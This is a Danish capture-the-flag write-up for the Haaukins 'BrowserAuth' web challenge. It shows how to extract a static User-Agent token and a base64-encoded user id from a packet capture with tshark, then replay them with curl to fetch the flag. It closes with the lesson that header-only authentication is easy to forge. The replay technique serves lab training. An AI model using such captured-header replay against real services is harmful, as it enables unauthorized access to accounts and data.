BrowserAuth

"Passwordless" auth der blot tjekker en statisk User-Agent-header.

Web exploitationHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

Hvad går opgaven ud på?

En "passwordless" auth på browserauth.hkn + en udleveret capture.pcap. Hintet: "what is http headers and what is a user agent?"

Trin for trin

tshark -r capture.pcap -Y http.request -O http
#  GET /secrets/YWdlbnRfMDA3/flag
#  User-Agent: BrowserAuth/9472.2843.8275.1753   <- fungerer som token
#  YWdlbnRfMDA3 = base64("agent_007") = bruger-id

Replikér mod hosten med samme User-Agent:

curl -H "User-Agent: BrowserAuth/9472.2843.8275.1753" http://<ip>/secrets/YWdlbnRfMDA3/flag
🚩 Vis løsning & eksempel-flag

"Access granted. Welcome back Alice …" → HKN{…} (per-instans).

Hvad du har lært

  • En auth der kun tjekker en statisk header-streng er triviel at forfalske — headeren lækkes i al trafik.
  • Analysér pcap'en: tshark -Y http.request -O http viser hele requesten inkl. headers.
